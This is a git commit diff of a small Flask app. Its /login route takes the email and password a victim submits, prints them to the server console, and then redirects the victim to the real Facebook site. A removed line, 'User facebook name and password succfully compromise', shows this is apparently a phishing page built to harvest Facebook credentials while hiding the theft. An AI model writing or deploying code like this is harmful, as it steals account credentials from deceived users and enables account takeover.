5860438ae387d9790204aa1f70ba03a21322346b
mohammed <mdrame113@gmail.com>
2019-11-10 16:04:01 -0800

    email and password vilidation done front end

--- app.py
+++ app.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, redirect
+from flask import Flask, render_template, redirect, request
 import requests
 
 
@@ -20,19 +20,29 @@ and render the info in the input to desire destination '''
 
 @app.route('/login', methods = ['POST', 'GET'] )
 def login():
-    
-    # Add info in a dictionary
-    userCredential = {"Email": "User name or email ",
-                      "Password": " *************** " }
+
+    # git user credential from form only if they enter something
+    userName = request.form.get("emailUsername")
+    password = request.form.get("password")
+  
+    #Form Validation will be done in front end in the html.
+    print(userName)
+    print(password)
+            
 
     
     ''' If user info is sucessfully passon to this route
         take them to the official facebook page '''
-    test_message = "User facebook name and password succfully compromise"
+
 
     return redirect('https://www.facebook.com/?stype=lo&jlou=AfeYCZSjoD8RTkU3MoAZ3Zzk5O6_0KBFaxHzBtgy8POvS64NNnPr6s4Lh040YN6f3EdvIxy-f2yf0dFkvw5bjKutIukOdXlipcRz7AVXK6b_EA&smuh=5272&lh=Ac_GsPJ4Lh-aUNQt')
 
+@app.route('/test')
+def test():
+    pass
 
+
+    
 
 
 
